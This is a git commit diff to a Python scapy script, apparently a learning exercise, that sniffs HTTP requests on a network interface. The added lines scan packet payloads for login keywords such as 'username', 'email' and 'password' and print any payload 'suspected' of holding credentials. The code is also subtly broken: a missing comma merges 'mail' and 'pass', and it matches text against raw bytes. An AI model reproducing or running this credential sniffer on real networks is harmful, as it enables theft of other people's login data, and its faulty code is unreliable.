1f3fe3af1e287421c586c7bd06ab96753decf59a
ElegantSoft <react.laravel.dev@gmail.com>
2020-07-24 09:46:56 -0400

    detect login data

--- main.py
+++ main.py
@@ -1,13 +1,19 @@
 #!/usr/bin/env python3
 
-import typing
 import scapy.all as scapy
 from scapy.layers import http
 
 
 def process_sniffed_packet(packet: scapy.Packet):
     if packet.haslayer(http.HTTPRequest):
-        print(packet.show())
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            login_keywords = ['user', 'username', 'uname', 'phone', 'mobile', 'email', 'mail'
+                                                                                       'pass', 'password', 'code',
+                              'remember']
+            for word in login_keywords:
+                if word in load:
+                    print("[+] suspected auth credits: " + str(load))
 
 
 def sniff(interface):
